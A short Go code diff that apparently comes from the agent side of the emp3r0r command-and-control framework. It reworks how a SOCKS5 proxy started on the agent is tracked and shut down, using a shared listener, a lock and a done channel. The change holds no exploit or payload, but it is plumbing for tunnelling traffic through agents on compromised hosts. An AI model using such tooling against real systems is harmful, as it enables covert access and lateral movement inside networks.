@@ -5,11 +5,12 @@ import (
 	"errors"
 	"fmt"
 	"io"
-	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"net"
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
@@ -42,8 +43,14 @@ func Socks5Proxy(op string, addr string) (err error) {
 	switch op {
 	case "on":
 		logging.Printf("Starting Socks5Proxy %s", addr)
+		def.ProxyDone = make(chan struct{})
 		go func() {
-			err = transport.StartSocks5Proxy(addr, common.RuntimeConfig.DoHServer, def.ProxyServer)
+			defer close(def.ProxyDone)
+			err = transport.StartSocks5Proxy(addr, common.RuntimeConfig.DoHServer, def.ProxyServer, func(l net.Listener) {
+				def.ProxyLock.Lock()
+				def.ProxyListener = l
+				def.ProxyLock.Unlock()
+			})
 			if err != nil {
 				logging.Printf("StartSock5Proxy %s: %v", addr, err)
 			}
@@ -53,7 +60,14 @@ func Socks5Proxy(op string, addr string) (err error) {
 		if def.ProxyServer == nil {
 			return errors.New("proxy server is not running")
 		}
-		err = def.ProxyServer.Shutdown()
+		def.ProxyLock.Lock()
+		if def.ProxyListener != nil {
+			def.ProxyListener.Close()
+		}
+		def.ProxyLock.Unlock()
+		if def.ProxyDone != nil {
+			<-def.ProxyDone
+		}
 		if err != nil {
 			logging.Print(err)
 		}
